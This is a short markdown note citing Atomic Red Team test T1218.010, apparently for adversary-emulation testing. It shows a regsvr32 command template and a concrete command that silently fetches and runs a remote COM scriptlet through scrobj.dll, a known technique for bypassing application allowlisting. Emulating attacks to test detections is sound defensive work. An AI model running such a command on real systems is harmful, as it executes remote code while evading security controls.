 <!-- T1218.010
 Determine the ability to run proccess using regsvr32 on a workstation  -->

> Source: [Atomic T1218.010](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md#atomic-test-2---regsvr32-remote-com-scriptlet-execution)

```
#{regsvr32path}\#{regsvr32name} /s /u /i:#{url} scrobj.dll

C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll

```
